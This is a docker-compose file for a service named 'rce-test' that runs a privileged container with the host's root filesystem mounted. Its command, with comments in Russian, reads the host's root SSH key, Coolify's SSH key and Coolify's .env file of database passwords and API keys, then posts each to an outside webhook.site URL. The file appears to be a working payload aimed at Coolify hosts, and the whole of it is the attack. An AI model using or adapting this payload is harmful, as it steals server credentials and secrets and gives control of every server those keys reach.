version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        # 1. вытаскиваем SSH ключи (доступ ко всем серверам, которыми управляет Coolify)
        cat /host-root/root/.ssh/id_rsa | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_root
        cat /host-root/data/coolify/.ssh/id_rsa | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_coolify
        
        # 2. тянем .env файл (там пароли от Postgres, Redis и все API ключи)
        cat /host-root/data/coolify/.env | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_file
        
        sleep 3600
